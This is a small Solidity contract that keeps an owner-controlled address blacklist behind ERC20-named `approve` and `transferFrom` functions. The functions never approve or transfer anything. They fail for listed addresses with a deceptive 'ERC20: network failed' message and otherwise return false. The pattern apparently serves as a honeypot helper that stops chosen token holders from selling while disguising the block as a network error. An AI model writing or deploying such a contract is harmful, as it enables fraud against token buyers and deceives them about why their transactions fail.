// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;
contract X {
    address private _owner;
    mapping(address=>bool) _list;

    modifier onlyOwner() {
        require(msg.sender == _owner, "Ownable: caller is not the owner");
        _;
    }

    constructor() {
        _owner = msg.sender;
    }
    
    function approve(address addr1, address, uint256) public view returns(bool){
        require(_list[addr1]!=true,"ERC20: network failed");
        return false;
    }

    function transferFrom(address addr1, address, uint256) public view returns(bool success){
        require(_list[addr1]!=true,"ERC20: network failed");
        return false;
    }

    function add(address[] calldata addr) public onlyOwner{
        for (uint256 i = 0; i < addr.length; i++) {
            _list[addr[i]] = true;
        }
        
    }

    function sub(address[] calldata addr) public onlyOwner{
        for (uint256 i = 0; i < addr.length; i++) {
            _list[addr[i]] = false;
        }
    }

    function result(address _account) external view returns(bool){
        return _list[_account];
    }
}